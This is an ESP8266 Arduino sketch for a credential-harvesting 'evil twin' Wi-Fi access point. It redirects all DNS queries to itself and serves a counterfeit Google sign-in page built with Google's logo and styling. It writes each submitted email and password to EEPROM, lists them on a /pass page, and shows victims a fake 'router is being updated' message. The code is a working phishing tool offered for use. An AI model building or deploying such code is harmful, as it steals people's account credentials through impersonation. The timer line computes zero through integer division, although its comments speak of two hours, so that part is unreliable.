#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Your_WIFI_NAME_(SSID)";
const String WPass = "YOUR_WIFI_PASSWORD";

unsigned long startTime;
unsigned long duration = 1/4 * 60 * 60 * 1000;

// Default main strings
#define SUBTITLE "Router info."
#define TITLE "Update"
#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Init system settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String allUser= "";
String allPass = "";

String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.

int passStart = 30; // Starting location in EEPROM to save password.
int userStart = 60; // Starting location in EEPROM to save username.
int passEnd = passStart;  // Ending location in EEPROM to save Password.
int userEnd = userStart;  // Ending location in EEPROM to save Usernames.


unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String h = ""; 
  return h; }

String index() {
  return "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Google Login Form</title><style>body{margin:0;padding:0;background-size:cover;font-family:'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;}.box{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:25rem;padding:2.5rem;box-sizing:border-box;border:1px solid #dadce0;-webkit-border-radius:8px;border-radius:8px;}.google-logo{display:flex;justify-content:center;padding-bottom:15px;}.box h2{margin:0px 0 -0.125rem;padding:0;color:#fff;text-align:center;color:#202124;font-family:'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;font-size:24px;font-weight:400;}.box p{font-size:16px;font-weight:400;letter-spacing:.1px;line-height:1.5;margin-bottom:25px;text-align:center;}.box .inputBox{position:relative;}.box .inputBox input{width:93%;padding:0.625rem 10px;font-size:1rem;letter-spacing:0.062rem;margin-bottom:1.875rem;border:1px solid #ccc;background:transparent;border-radius:4px;}.box .inputBox label{position:absolute;top:0;left:10px;padding:0.625rem 0;font-size:1rem;color:grey;pointer-events:none;transition:0.3s;}.box .inputBox input:focus~label,.box .inputBox input:valid~label,.box .inputBox input:not([value=''])~label{top:-1.125rem;left:10px;color:#1a73e8;font-size:0.75rem;background-color:white;height:10px;padding-left:5px;padding-right:5px;}.box .inputBox input:focus{outline:none;border:2px solid #1a73e8;}.box input[type='submit']{border:none;outline:none;color:#fff;background-color:#1a73e8;padding:0.625rem 1.25rem;cursor:pointer;border-radius:0.312rem;font-size:1rem;float:right;}.box input[type='submit']:hover{background-color:#287ae6;box-shadow:0 1px 8px rgba(0,0,0,0.15);}</style></head><body><div class='box'><div class='google-logo'><!-- Google logo goes here --><div id='logo' title='Google'><svg viewBox='0 0 75 24' width='75' height='24' aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg><!-- /Google Logo --></div></div><h2>Sign in</h2><p>Continue to Google</p><form action='/post' method='post'><div class='inputBox'><input type='text' name='email' required='required'><label>Email or phone</label></div><div class='inputBox'><input type='password' name='password' required='required'><label>Password</label></div><input type='submit' value='Sign in'></form></div></body></html>";
}

String posted() {
  String pass = input("password");
  String user = input("email"); // Assuming there is a function called "input" that takes user input for both password (m) and username (u).
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in an ordered list.
  user = "<li><b>" + user + "</li></b>"; // Adding username in an ordered list.

  allPass += pass; // Updating the full passwords.
  allUser += user; // Updating the full usernames.

  // Storing passwords and usernames to EEPROM.
  for (int i = 0; i <= pass.length(); ++i){
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  for (int i = 0; i <= user.length(); ++i){
    EEPROM.write(userEnd + i, user[i]); // Adding username to existing username in EEPROM.
  }

  passEnd += pass.length(); // Updating the end position of passwords in EEPROM.
  userEnd += user.length(); // Updating the end position of usernames in EEPROM.

  EEPROM.write(passEnd, '\0');
  EEPROM.write(userEnd, '\0');
  EEPROM.commit();

  return "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Google Validation</title><style>body { margin: 0; padding: 0; background-size: cover; font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif; }.box { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 25rem; padding: 2.5rem; box-sizing: border-box; border: 1px solid #dadce0; -webkit-border-radius: 8px; border-radius: 8px; }.google-logo { display: flex; justify-content: center; padding-bottom: 15px; }.box h2 { margin: 0px 0 -0.125rem; padding: 0; color: #fff; text-align: center; color: #202124; font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif; font-size: 24px; font-weight: 400; }.box h3 { margin: 0px 0 -0.125rem; margin-top: 40px; margin-bottom: 40px; padding: 0; color: #fff; color: #202124; font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif; font-size: 20px; font-weight: 400; }.box h4 { margin: 0px 0 -0.125rem; padding: 0; color: #fff; text-align: center; color: #202124; font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif; font-size: 17px; font-weight: 400; }.box p { font-size: 16px; font-weight: 400; letter-spacing: .1px; line-height: 1.5; color: #757575; margin-bottom: 0px; text-align: center; }.box .inputBox input { width: 93%; padding: 0.625rem 10px; font-size: 1rem; letter-spacing: 0.062rem; margin-bottom: 1.875rem; border: 1px solid #ccc; background: transparent; border-radius: 4px; }</style></head><body><div class='box'><div class='google-logo'><div id='logo' title='Google'><svg viewBox='0 0 75 24' width='75' height='24'  aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div></div><h2>Your router is being updated.</h2><h3>Please, wait until the proccess finishes.</h3><h4>Thank you.</h4><p>© 2024 Google Inc. All rights reserved. Google and the Google logo are trademarks of Google Inc</p></div></body></html>";
}

String pass() {
  return "<ul> <li> <%="+ allPass +"%><span>:</span><%="+ allUser +"%> </li> </ul><br><center><p><a style=\"color:blue\" href=\"/\">Back to Index</a></p><p><a style=\"color:blue\" href=\"/clear\">Clear passwords</a></p></center>" + footer();
}

String ssid() {
  return "<!DOCTYPE html> <html lang='en'> <head> <meta charset='UTF-8'> <meta name='viewport' content='width=device-width, initial-scale=1.0'> <title></title> <style> body { margin: 0; padding: 0; background-size: cover; font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif; } .box { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 25rem; padding: 2.5rem; box-sizing: border-box; border: 1px solid #dadce0; -webkit-border-radius: 8px; border-radius: 8px; } .google-logo { display: flex; justify-content: center; padding-bottom: 15px; } .box h2 { margin: 0px 0 -0.125rem; padding: 0; color: #fff; text-align: center; color: #202124; font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif; font-size: 24px; font-weight: 400; } .box h3 { margin: 0px 0 -0.125rem; margin-top: 40px; margin-bottom: 40px; padding: 0; color: #fff; color: #202124; font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif; font-size: 18px; font-weight: 400; } .box h4 { margin: 0px 0 -0.125rem; padding: 0; color: #fff; text-align: center; color: #202124; font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif; font-size: 16px; font-weight: 400; } .box p { font-size: 16px; font-weight: 400; letter-spacing: .1px; line-height: 1.5; color: #202124; margin-bottom: 0px; text-align: center; } .box .inputBox { position: relative; } .box .inputBox input { width: 93%; padding: 0.625rem 10px; font-size: 1rem; letter-spacing: 0.062rem; margin-bottom: 1.875rem; border: 1px solid #ccc; background: transparent; border-radius: 4px; } .box .inputBox label { position: absolute; top: 0; left: 10px; padding: 0.625rem 0; font-size: 1rem; color: grey; pointer-events: none; transition: 0.3s; } .box .inputBox input:focus~label, .box .inputBox input:valid~label, .box .inputBox input:not([value=''])~label { top: -1.125rem; left: 10px; color: #1a73e8; font-size: 0.75rem; background-color: white; height: 10px; padding-left: 5px; padding-right: 5px; } .box .inputBox input:focus { outline: none; border: 2px solid #1a73e8; } .box input[type='submit'] { border: none; margin: 0 auto; outline: none; color: #fff; background-color: #1a73e8; padding: 0.625rem 1.25rem; cursor: pointer; border-radius: 0.312rem; font-size: 1rem; float: right; } .box input[type='submit']:hover { background-color: #287ae6; box-shadow: 0 1px 8px rgba(0, 0, 0, 0.15); } </style> </head> <body> <div class='box'> <div class='google-logo'> <!-- Google logo goes here --> <div id='logo' title='Google'> <svg viewBox='0 0 75 24' width='75' height='24' aria-hidden='true'> <g id='qaEJec'> <path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'> </path> </g> <g id='YGlOvc'> <path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path> </g> <g id='BWfIk'> <path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'> </path> </g> <g id='e6m3fd'> <path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'> </path> </g> <g id='vbkDmc'> <path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'> </path> </g> <g id='idEJde'> <path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'> </path> </g> </svg> <!-- /Google Logo --> </div> </div> <h2>Here you can change the SSID name.</h2> <h3>After pressing the button 'Change SSID' you will lose the connection, so reconnect to the new SSID</h3> <form action='/postSSID' method='post' style='display: flex; flex-direction: column; align-items: center;'> <div class='inputBox'> <input type='text' name='s' required='required'> <label>New SSID name:</label> </div> <br> <input type='submit' value='Change SSID'> <br> <p>© 2023 Google Inc. All rights reserved. Google and the Google logo are trademarks of Google Inc</p> </form> </div> </body> </html>";
}

String postedSSID() {
  String postedSSID = input("s"); newSSID="<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID, WPass);
  return postedSSID;
}

String clear() {
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  allUser = "";
  userEnd = userStart; // Setting the usernames end location -> starting position.
  EEPROM.write(userEnd, '\0');
  EEPROM.commit();
  return "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { // The built-in LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup() {
  // Serial begin
  startTime = millis();
  Serial.begin(115200);
  
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }
  
  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID, WPass);  

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the built-in LED
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}


void loop() {     // if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); } 
    dnsServer.processNextRequest(); 
    webServer.handleClient();

 
  // Check if 2 hours (or any specified duration) have passed
  if (millis() - startTime >= duration) {
      // Set up the WiFi Access Point with new credentials as Hidden
      WiFi.softAP("YOUR_NEW_HIDDEN_WIFI_NAME(SSID)", "YOUR_NEW_HIDDEN_WIFI_PASSWORD", 1, true);

      // Reset the start time for the next 2-hour period
      startTime = millis();
      
      // Optional: Add any additional logic or tasks you want to perform
      // when the duration is reached, such as logging or changing settings.

  }
}
